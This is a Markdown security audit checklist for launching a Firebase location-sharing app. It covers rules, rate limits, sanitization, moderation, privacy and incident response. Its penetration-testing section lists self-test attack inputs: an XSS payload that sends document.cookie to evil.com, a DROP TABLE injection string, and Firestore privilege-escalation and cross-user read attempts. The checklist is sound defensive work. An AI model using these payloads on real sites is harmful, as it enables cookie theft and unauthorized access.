# 🔐 Security Audit Checklist

Complete this checklist before launching your app to production.

## ✅ Pre-Launch Security Audit

### 1. Authentication & Authorization

- [ ] Google OAuth is the only authentication method
- [ ] Anonymous users cannot create pings
- [ ] Users can only modify their own data
- [ ] Friend system properly restricts private content visibility
- [ ] Email verification is enabled (Firebase Console → Authentication → Settings)

**Test:**
```javascript
// In browser console (should all FAIL):

// Try to create ping without auth
firebase.firestore().collection('pings').add({text: 'test', lat: 0, lon: 0});

// Try to modify another user's data
firebase.firestore().collection('users').doc('OTHER_UID').update({pp: 999});
```

### 2. Firestore Security Rules

- [ ] Rules are deployed: `firebase firestore:rules:get`
- [ ] Direct writes to pings collection are blocked
- [ ] Direct writes to users collection are restricted
- [ ] Direct writes to handles collection are blocked
- [ ] Notifications can only be created by Cloud Functions
- [ ] Reports collection only allows reads by admins

**Test:**
```bash
# Deploy rules and verify
firebase deploy --only firestore:rules
firebase firestore:rules:get

# Test in browser console (should FAIL):
firebase.firestore().collection('pings').add({
  text: 'Direct write attempt',
  lat: 45.5, 
  lon: -73.5
});
// Expected: "Missing or insufficient permissions"
```

### 3. Storage Security Rules

- [ ] Rules are deployed: `firebase storage:rules:get`
- [ ] File size limits are enforced (5MB images, 50MB videos)
- [ ] Only authenticated users can upload
- [ ] File types are restricted (images and videos only)
- [ ] Users can only access their own avatars for writing

**Test:**
```bash
# Deploy storage rules
firebase deploy --only storage

# Try uploading a large file (should fail)
# Try uploading without authentication (should fail)
```

### 4. Cloud Functions Security

- [ ] All Cloud Functions are deployed
- [ ] Functions enforce authentication
- [ ] Rate limiting is working (server-side)
- [ ] Input validation is comprehensive
- [ ] Geofencing is enforced
- [ ] Real name detection is active
- [ ] Functions handle errors gracefully

**Test:**
```bash
# Check deployed functions
firebase functions:list

# Monitor function logs
firebase functions:log --follow

# Try to create more than 3 pings (should be blocked)
# Try to create ping outside geofence (should be blocked)
```

### 5. Rate Limiting & Quotas

- [ ] Daily ping limit is 3 (for non-subscribers)
- [ ] 5-minute cooldown between pings is enforced
- [ ] Quota is tracked server-side (not client-side)
- [ ] Subscribers have unlimited pings
- [ ] Username changes have 24-hour cooldown

**Test:**
Create 3 pings quickly, then try a 4th. Should see: "Daily limit reached" or "Please wait X minutes"

### 6. Input Validation & Sanitization

- [ ] XSS protection script is loaded
- [ ] All user input is sanitized before display
- [ ] HTML entities are escaped
- [ ] Script tags are blocked
- [ ] Real names are detected and blocked
- [ ] Text length limits are enforced (140 chars for pings, 200 for comments)

**Test:**
```javascript
// Try to inject HTML (should be escaped)
// In ping text field, enter:
<script>alert('XSS')</script>
// Should display as plain text, not execute

// Try entering two capitalized words (real name detection)
// Should be blocked
```

### 7. Content Moderation

- [ ] NSFW image detection is working
- [ ] Video analysis is enabled
- [ ] Upload is blocked for inappropriate content
- [ ] Users are notified why content was blocked
- [ ] Moderation system loads before upload form

**Test:**
- Try uploading test image (should work)
- System should analyze before allowing upload
- Check console for moderation logs

### 8. Data Privacy & GDPR

- [ ] Privacy Policy is created and linked
- [ ] Terms of Service are created and linked
- [ ] Users can view their data
- [ ] Users can delete their account (via support)
- [ ] Data is automatically deleted after 24 hours (pings)
- [ ] User consent is obtained for data collection

**Create:**
1. Privacy policy (use [TermsFeed](https://www.termsfeed.com/))
2. Terms of Service
3. Add links to app footer

### 9. Monitoring & Alerts

- [ ] Firebase App Check is enabled (prevents API abuse)
- [ ] Billing alerts are configured ($50 threshold)
- [ ] Error rate alerts are enabled
- [ ] Security rule violation alerts are active
- [ ] Cloud Function error tracking is enabled

**Setup:**
```bash
# Enable App Check in Firebase Console
# Go to: App Check → Register app → reCAPTCHA v3

# Set up billing alerts
# Google Cloud Console → Billing → Budgets & alerts
```

### 10. Environment Variables

- [ ] `.env` file is NOT committed to git
- [ ] `.env.example` template exists
- [ ] Sensitive keys are not in client code
- [ ] Firebase config is properly secured
- [ ] API keys have domain restrictions

**Verify:**
```bash
# Check .gitignore includes .env
cat .gitignore | grep .env

# Ensure .env is not in git history
git log --all --full-history -- .env
# Should show nothing
```

### 11. HTTPS & Transport Security

- [ ] All traffic uses HTTPS
- [ ] HTTP redirects to HTTPS (Firebase Hosting does this automatically)
- [ ] Security headers are configured in firebase.json
- [ ] Content Security Policy is set
- [ ] Cookies are secure and httpOnly (if using cookies)

**Verify:**
```bash
# Check security headers
curl -I https://your-app.web.app

# Should see:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
```

### 12. Error Handling

- [ ] Errors don't expose sensitive information
- [ ] Stack traces are not shown to users
- [ ] Generic error messages are displayed
- [ ] Detailed errors are logged server-side
- [ ] Failed logins don't reveal account existence

**Test:**
Try invalid operations and ensure error messages are generic (not revealing database structure)

### 13. Dependencies & Updates

- [ ] All npm packages are up to date
- [ ] No known vulnerabilities in dependencies
- [ ] Regular update schedule is planned
- [ ] Dependabot or similar is configured

**Check:**
```bash
# Check for vulnerabilities
cd functions
npm audit

# Update packages
npm update

# Check for outdated packages
npm outdated
```

### 14. Backup & Recovery

- [ ] Firestore export is scheduled (monthly recommended)
- [ ] Storage backup is configured
- [ ] Recovery procedure is documented
- [ ] Backup restoration has been tested

**Setup:**
```bash
# Export Firestore
gcloud firestore export gs://YOUR_BUCKET/backups

# Or use Firebase Console → Firestore → Import/Export
```

### 15. Performance & Scalability

- [ ] Database queries are indexed
- [ ] Cloud Functions have appropriate timeouts
- [ ] Images are compressed before upload
- [ ] Pagination is used for long lists
- [ ] Caching is implemented where appropriate

**Verify:**
```bash
# Deploy indexes
firebase deploy --only firestore:indexes

# Check for missing indexes in logs
firebase functions:log | grep "index"
```

## 🧪 Penetration Testing

### Try These Attacks (Should All Fail):

#### 1. SQL Injection (Not applicable to Firestore, but test anyway)
```javascript
const evilText = "'; DROP TABLE users; --";
// Try creating ping with this text
// Should be sanitized or rejected
```

#### 2. XSS Attacks
```javascript
const evilText = '<script>fetch("https://evil.com?cookie="+document.cookie)</script>';
// Try creating ping with this text
// Should be escaped and displayed as text
```

#### 3. CSRF Attacks
- Try making requests from different origin
- Should be blocked by CORS and authentication

#### 4. Rate Limit Bypass
- Try creating 10 pings quickly
- Should be blocked after 3

#### 5. Privilege Escalation
```javascript
// Try to give yourself admin privileges
firebase.firestore().collection('users').doc('YOUR_UID').update({
  isAdmin: true,
  pp: 999999
});
// Should FAIL
```

#### 6. Access Other Users' Data
```javascript
// Try to read another user's private pings
firebase.firestore().collection('pings')
  .where('uid', '==', 'OTHER_USER_UID')
  .where('visibility', '==', 'private')
  .get();
// Should return empty or only visible pings
```

## 📋 Final Checklist Summary

Total Items: 60+

Before going live:
- [ ] All security rules deployed and tested
- [ ] All Cloud Functions deployed and working
- [ ] XSS protection verified
- [ ] Rate limiting tested
- [ ] Content moderation active
- [ ] Privacy policy and ToS added
- [ ] Monitoring and alerts configured
- [ ] Billing limits set
- [ ] Domain configured (if using custom domain)
- [ ] SSL certificate active (automatic with Firebase)
- [ ] Error handling tested
- [ ] Backup procedure established
- [ ] Team has access to Firebase Console
- [ ] Incident response plan created
- [ ] Contact for security reports established

## 🚨 Incident Response Plan

If a security incident occurs:

1. **Immediately**: Disable affected functionality
   ```bash
   # Disable functions
   firebase functions:delete FUNCTION_NAME
   
   # Or update rules to block all access temporarily
   firebase deploy --only firestore:rules
   ```

2. **Assess**: Check logs for extent of breach
   ```bash
   firebase functions:log
   ```

3. **Notify**: Inform affected users if data was compromised

4. **Fix**: Deploy security patch

5. **Review**: Conduct post-mortem and update security

## 📧 Security Contact

Set up a security contact email:
- security@yourdomain.com
- Or GitHub Security Advisories
- Or dedicated vulnerability disclosure program

## ✅ Certification

Once all items are checked:

**I certify that I have:**
- ✅ Completed all security checks
- ✅ Tested all attack vectors
- ✅ Configured monitoring and alerts
- ✅ Created backup procedures
- ✅ Documented incident response plan
- ✅ Informed team of security practices

**Auditor Name:** ___________________________

**Date:** ___________________________

**Signature:** ___________________________

---

**Remember: Security is an ongoing process, not a one-time task.**

Re-audit quarterly and after any major changes.

